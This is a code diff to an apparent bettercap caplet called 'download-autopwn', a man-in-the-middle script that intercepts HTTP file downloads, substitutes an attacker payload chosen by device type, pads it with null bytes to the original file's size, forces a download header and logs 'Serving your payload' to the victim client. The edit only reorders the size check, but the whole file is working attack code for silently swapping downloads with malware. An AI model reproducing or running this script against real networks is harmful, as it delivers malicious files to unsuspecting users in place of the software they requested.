@@ -49,25 +49,30 @@ function onResponse(req, res) {
 						         redLine + "  Found " + boldRed + extension.toUpperCase() + reset + " extension in " + boldRed + req.Hostname + req.Path + reset + 
 						         redLine + 
 						         redLine + "  Grabbing " + boldRed + targets[t]["device"].toUpperCase() + reset + " payload..."
-						// Check requested file size
-						requestedFile = res.ReadBody()
-						requestedFileSize = requestedFile.length
+						// Check our payload size
 						payload = readFile("caplets/download-autopwn/" + targets[t]["device"] + "/payload." + extension)
 						payloadSize = payload.length
-						logStr += redLine + "  The size of the requested file is " + boldRed + requestedFileSize + reset + " bytes" + 
-						          redLine + "  The raw size of your payload is " + boldRed + payloadSize + reset + " bytes" + redLine
+						logStr += redLine + "  The raw size of your payload is " + boldRed + payloadSize + reset + " bytes"
 						// Append nullbytes to payload if resizing is enabled and if requested file is larger than payload
-						if ( env("downloadautopwn.resizepayloads") == "true" && requestedFileSize > payloadSize ) {
-							logStr += redLine + "  Resizing your payload to " + boldRed + requestedFileSize + reset + " bytes..."
-							sizeDifference = requestedFileSize - payloadSize
-							nullbyteString = Array(sizeDifference + 1).join(nullbyte)
-							payload += nullbyteString
+						if ( env("downloadautopwn.resizepayloads") == "true" ) {
+							// Check requested file size
+							requestedFile = res.ReadBody()
+							requestedFileSize = requestedFile.length
+							logStr += redLine + "  The size of the requested file is " + boldRed + requestedFileSize + reset + " bytes"
+							// Append nullbytes if required
+							if (requestedFileSize > payloadSize) {
+								logStr += redLine + "  Resizing your payload to " + boldRed + requestedFileSize + reset + " bytes..."
+								sizeDifference = requestedFileSize - payloadSize
+								nullbyteString = Array(sizeDifference + 1).join(nullbyte)
+								payload += nullbyteString
+							}
 						}
 						// Set Content-Disposition header to enforce file download instead of in-browser preview
 						res.SetHeader("Content-Disposition", "attachment; filename=\"" + requestedFileName + "\"")
-						// Update Content-Length header in case our payload is larger than the requested file
+						// Update Content-Length header
 						res.SetHeader("Content-Length", payload.length)
-						logStr += redLine + "  Serving your payload to " + boldRed + req.Client + reset + "...\n"
+						logStr += redLine + 
+						          redLine + "  Serving your payload to " + boldRed + req.Client + reset + "...\n"
 						log(logStr)
 						res.Body = payload
 					}
